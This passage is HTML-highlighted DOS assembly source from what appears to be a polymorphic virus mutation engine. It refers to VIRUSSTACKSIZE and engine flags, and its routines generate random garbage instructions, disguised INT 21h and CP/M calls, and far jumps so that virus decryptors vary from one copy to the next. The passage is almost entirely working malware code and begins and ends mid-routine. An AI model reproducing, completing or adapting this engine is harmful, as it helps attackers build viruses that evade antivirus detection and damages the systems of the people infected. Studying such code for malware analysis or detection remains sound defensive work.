</span><span class="sc1">;ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ</span><span class="sc0">
</span><span class="sc5">pblabel</span><span class="sc0"> </span><span class="sc5">encode_push_addr</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">choose_word_register</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
    </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">encode_mov</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">di</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">VIRUSSTACKSIZE</span><span class="sc0"> </span><span class="sc1">;[engdata.sourceptr]</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">engdata.targetptr</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">push_any_sux1</span><span class="sc0">
</span><span class="sc1">;endp</span><span class="sc0">
</span><span class="sc1">;ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ</span><span class="sc0">

</span><span class="sc1">;ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ</span><span class="sc0">
</span><span class="sc5">pblabel</span><span class="sc0"> </span><span class="sc5">encode_far_jmp</span><span class="sc0">       </span><span class="sc1">;cx:dx</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">RND_GET</span><span class="sc0">
    </span><span class="sc5">DOIF</span><span class="sc0"> </span><span class="sc5">P</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">encode_push</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">encode_push</span><span class="sc0">
        </span><span class="sc5">STO_BYTE</span><span class="sc0"> </span><span class="sc5">opRETF</span><span class="sc0">
    </span><span class="sc5">DOELSE</span><span class="sc0">
        </span><span class="sc5">STO_BYTE</span><span class="sc0"> </span><span class="sc5">opJMPFAR</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">stosw</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">stosw</span><span class="sc0">
    </span><span class="sc5">DONE</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">shit</span><span class="sc0">
</span><span class="sc1">;endp</span><span class="sc0">
</span><span class="sc1">;ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ</span><span class="sc0">

</span><span class="sc1">;ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ</span><span class="sc0">
</span><span class="sc5">pblabel</span><span class="sc0"> </span><span class="sc5">choose_function</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">rnd_get_byte</span><span class="sc0">
</span><span class="sc1">;- choose function</span><span class="sc0">
    </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0Fh</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">int21func</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">cf_1</span><span class="sc0">
    </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
</span><span class="sc1">;- setup CF</span><span class="sc0">
    </span><span class="sc5">DOIF</span><span class="sc0"> </span><span class="sc5">B</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">choose_word_register</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">encode_zero_reg</span><span class="sc0">  </span><span class="sc1">;encode CF=0</span><span class="sc0">
    </span><span class="sc5">DONE</span><span class="sc0">
</span><span class="sc1">;comment #</span><span class="sc0">
</span><span class="sc1">;- setup DX</span><span class="sc0">
</span><span class="sc1">;- enc   mov    dx,0..7fff</span><span class="sc0">
</span><span class="sc1">;- need for deldir, delfile, findfirst</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">setdx</span><span class="sc0">
    </span><span class="sc5">DOIF</span><span class="sc0"> </span><span class="sc5">AE</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">R_DX</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">encode_mov</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">RND_GET</span><span class="sc0">
        </span><span class="sc6">shr</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">stosw</span><span class="sc0">
    </span><span class="sc5">DONE</span><span class="sc0">
</span><span class="sc1">;#</span><span class="sc0">
    </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">   </span><span class="sc1">;pseudo-random</span><span class="sc0">
</span><span class="sc1">;- setup reg AH</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">opMOV_AHimm</span><span class="sc0"> </span><span class="sc1">;mov ah,xx</span><span class="sc0">
    </span><span class="sc5">DOIF</span><span class="sc0"> </span><span class="sc5">P</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc0">   </span><span class="sc1">;mov     cl,R_AX</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">encode_mov</span><span class="sc0">  </span><span class="sc1">;mov ax,xxxx</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">RND_GET_BYTE</span><span class="sc0">
    </span><span class="sc5">DONE</span><span class="sc0">

    </span><span class="sc6">stosb</span><span class="sc0">
    </span><span class="sc6">movsb</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc1">;endp</span><span class="sc0">
</span><span class="sc1">;ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ</span><span class="sc0">

</span><span class="sc1">;ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ</span><span class="sc0">
</span><span class="sc5">pblabel</span><span class="sc0"> </span><span class="sc5">int_any_reg</span><span class="sc0">
            </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">8h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1ch</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">28h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2Bh</span><span class="sc0">
            </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">11h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">12h</span><span class="sc0">
</span><span class="sc5">pblabel</span><span class="sc0"> </span><span class="sc5">with_setup</span><span class="sc0">
            </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">16h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">17h</span><span class="sc0">
</span><span class="sc1">;ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ</span><span class="sc0">
</span><span class="sc5">pblabel</span><span class="sc0"> </span><span class="sc5">cpm</span><span class="sc0">
            </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">18h</span><span class="sc4">,</span><span class="sc2">1dh</span><span class="sc4">,</span><span class="sc2">1eh</span><span class="sc4">,</span><span class="sc2">20h</span><span class="sc0">
</span><span class="sc5">pblabel</span><span class="sc0"> </span><span class="sc5">int21func</span><span class="sc0">  </span><span class="sc1">;db 10h dup (30h);function return cf=1 or no change cf</span><span class="sc0">
            </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">51h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">62h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">30h</span><span class="sc0">        </span><span class="sc1">;- use as cmp too</span><span class="sc0">
            </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">19h</span><span class="sc4">,</span><span class="sc2">2ah</span><span class="sc4">,</span><span class="sc2">2ch</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">36h</span><span class="sc4">,</span><span class="sc2">4dh</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">23h</span><span class="sc4">,</span><span class="sc0">         </span><span class="sc2">0bh</span><span class="sc1">; 54,</span><span class="sc0">
</span><span class="sc5">pblabel</span><span class="sc0"> </span><span class="sc5">cf_1</span><span class="sc0">       </span><span class="sc1">;function return cf=1        /--/--/- need setup(DX&lt;&gt;-1)</span><span class="sc0">
            </span><span class="sc1">;46,</span><span class="sc0">
            </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">5ch</span><span class="sc0">
</span><span class="sc5">pblabel</span><span class="sc0"> </span><span class="sc5">setdx</span><span class="sc0">      </span><span class="sc1">;db    5c,5c,5c</span><span class="sc0">
            </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">3Dh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">41h</span><span class="sc4">,</span><span class="sc2">4eh</span><span class="sc4">,</span><span class="sc2">3Ah</span><span class="sc0">    </span><span class="sc1">;4Bh, -sux</span><span class="sc0">
</span><span class="sc1">;ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ</span><span class="sc0">

</span><span class="sc1">;Ä encode int 21 ÄÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ</span><span class="sc0">
</span><span class="sc5">pblabel</span><span class="sc0"> </span><span class="sc5">encode_int21</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">protect_reg</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">R_AX</span><span class="sc0">
    </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc5">engdata.zmeflags</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc9">MASK</span><span class="sc0"> </span><span class="sc5">EN_USE_INT</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0">     </span><span class="sc5">unprotect_reg1</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">engdata.useregs</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc5">REG_ALL</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">unprotect_reg1</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">RND_GET_BYTE</span><span class="sc0">
</span><span class="sc1">;    jz      encode_int</span><span class="sc0">
    </span><span class="sc5">DOIF</span><span class="sc0"> </span><span class="sc5">Z</span><span class="sc0">
</span><span class="sc1">;ÄENCODE INTERRUPTÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">
</span><span class="sc5">pblabel</span><span class="sc0"> </span><span class="sc5">encode_int</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">RND_GET_THREE_BITS</span><span class="sc0">
    </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc5">engdata.zmeflags</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc9">MASK</span><span class="sc0"> </span><span class="sc5">EN_RELOCATOR</span><span class="sc0">
    </span><span class="sc5">DOIF</span><span class="sc0"> </span><span class="sc5">Z</span><span class="sc0">  </span><span class="sc1">;only without relocator</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">RND_GET_THREE_BITS</span><span class="sc0">
</span><span class="sc1">;        jz      encode_cpm</span><span class="sc0">
        </span><span class="sc5">DOIF</span><span class="sc0"> </span><span class="sc5">Z</span><span class="sc0">
</span><span class="sc1">;ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ</span><span class="sc0">
</span><span class="sc5">pblabel</span><span class="sc0"> </span><span class="sc5">encode_cpm</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">encode_push_addr</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">bx</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">many_nonbranch_garble</span><span class="sc0">
    </span><span class="sc5">STO_BYTE</span><span class="sc0"> </span><span class="sc5">opPUSH_CS</span><span class="sc0">          </span><span class="sc1">; encode PUSH CS</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">many_nonbranch_garble</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">RND_GET_THREE_BITS</span><span class="sc0"> </span><span class="sc1">;push sux</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">push_any_sux</span><span class="sc0"> </span><span class="sc1">;al-register for push</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">many_nonbranch_garble</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc5">R_CX</span><span class="sc0">               </span><span class="sc1">;mov cx,cpmfunc</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">encode_mov</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">RND_GET_THREE_BITS</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">cpm</span><span class="sc0">
    </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
    </span><span class="sc6">movsb</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">RND_GET</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">RND_GET_THREE_BITS</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0Ch</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc0">
    </span><span class="sc6">shl</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
    </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">encode_far_jmp</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">bx</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">
</span><span class="sc5">pblabel</span><span class="sc0"> </span><span class="sc5">unprotect_reg1</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">unprotect_reg</span><span class="sc0">
</span><span class="sc1">;ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ</span><span class="sc0">

        </span><span class="sc5">DONE</span><span class="sc0">
    </span><span class="sc5">DONE</span><span class="sc0">
</span><span class="sc1">;Ä encode int 8, 1C, 16, 17, 11, 12, 2B, 28 ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">5</span><span class="sc0">
    </span><span class="sc5">DOIF</span><span class="sc0"> </span><span class="sc5">A</span><span class="sc0"> </span><span class="sc1">;need setup</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc5">sto_byte</span><span class="sc0"> </span><span class="sc5">opMOV_AHimm</span><span class="sc0">
        </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">   </span><span class="sc1">;pseudo-random</span><span class="sc0">
        </span><span class="sc6">sbb</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">   </span><span class="sc1">;-1 | 0</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">      </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">      </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">        </span><span class="sc1">; 1 | 2</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">
    </span><span class="sc5">DONE</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">int_any_reg</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">many_nonbranch_garble</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
    </span><span class="sc5">sto_byte</span><span class="sc0"> </span><span class="sc5">opINT</span><span class="sc0">
    </span><span class="sc6">movsb</span><span class="sc0">
</span><span class="sc5">pblabel</span><span class="sc0"> </span><span class="sc5">unprotect_reg</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">protect_reg</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc1">;ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ</span><span class="sc0">

    </span><span class="sc5">DONE</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">   </span><span class="sc5">RND_GET_BYTE</span><span class="sc0">
    </span><span class="sc5">DOIF</span><span class="sc0"> </span><span class="sc5">Z</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">choose_function</span><span class="sc0">
        </span><span class="sc5">sto_two_byte</span><span class="sc0"> </span><span class="sc5">opINT</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">
    </span><span class="sc5">DOELSE</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">RND_GET_BYTE</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">6</span><span class="sc0">
        </span><span class="sc5">DOIF</span><span class="sc0"> </span><span class="sc5">Z</span><span class="sc0">
            </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">6</span><span class="sc4">-</span><span class="sc2">1Eh</span><span class="sc0">
        </span><span class="sc5">DONE</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">     </span><span class="sc1">;push ds(es)</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">many_nonbranch_garble</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">choose_word_register</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">encode_mov</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">RND_GET_THREE_BITS</span><span class="sc0">
        </span><span class="sc6">stosw</span><span class="sc0">
        </span><span class="sc6">shl</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">engdata.segm_IDT</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">84h</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">engdata.segm_IDT</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
</span><span class="sc1">;- enc mov ds(es), reg</span><span class="sc0">
        </span><span class="sc5">sto_byte</span><span class="sc0"> </span><span class="sc2">8Eh</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">  </span><span class="sc1">;ax=6 | 1E</span><span class="sc0">
        </span><span class="sc5">MASKA</span><span class="sc0">   </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">110xx000</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">choose_function</span><span class="sc0">  </span><span class="sc1">;clear C before pushf</span><span class="sc0">
        </span><span class="sc5">sto_byte</span><span class="sc0">   </span><span class="sc5">opPUSHF</span><span class="sc0">  </span><span class="sc1">;pushf</span><span class="sc0">
</span><span class="sc1">;        call    many_nonbranch_garble</span><span class="sc0">

        </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc5">engdata.zmeflags</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc9">MASK</span><span class="sc0"> </span><span class="sc5">EN_RELOCATOR</span><span class="sc0">
        </span><span class="sc5">GOIN</span><span class="sc0"> </span><span class="sc5">NZ</span><span class="sc0"> </span><span class="sc1">;force use call</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">RND_GET</span><span class="sc0">
        </span><span class="sc5">DOIF</span><span class="sc0"> </span><span class="sc5">Z</span><span class="sc0"> </span><span class="sc1">;use call</span><span class="sc0">
            </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">  </span><span class="sc1">;ax=6 | 1E</span><span class="sc0">
            </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">6</span><span class="sc0">
            </span><span class="sc5">DOIF</span><span class="sc0"> </span><span class="sc5">E</span><span class="sc0">
                </span><span class="sc5">sto_byte</span><span class="sc0">   </span><span class="sc5">opSEGES</span><span class="sc0"> </span><span class="sc1">;seges</span><span class="sc0">
            </span><span class="sc5">DONE</span><span class="sc0">                   </span><span class="sc1">;ZF=1 -&gt; 26, ZF=0 -&gt; EB(maybe)</span><span class="sc0">
            </span><span class="sc5">sto_two_byte</span><span class="sc0"> </span><span class="sc2">0ffh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1Eh</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">engdata.segm_IDT</span><span class="sc4">]</span><span class="sc0">
            </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc0">
            </span><span class="sc6">stosw</span><span class="sc0">
        </span><span class="sc5">DOELSE</span><span class="sc0"> </span><span class="sc1">;use jmp</span><span class="sc0">
            </span><span class="sc5">sto_byte</span><span class="sc0"> </span><span class="sc5">opPUSH_CS</span><span class="sc0">  </span><span class="sc1">;push  cs</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">encode_push_addr</span><span class="sc0">
            </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">  </span><span class="sc1">;ax=6 | 1E</span><span class="sc0">
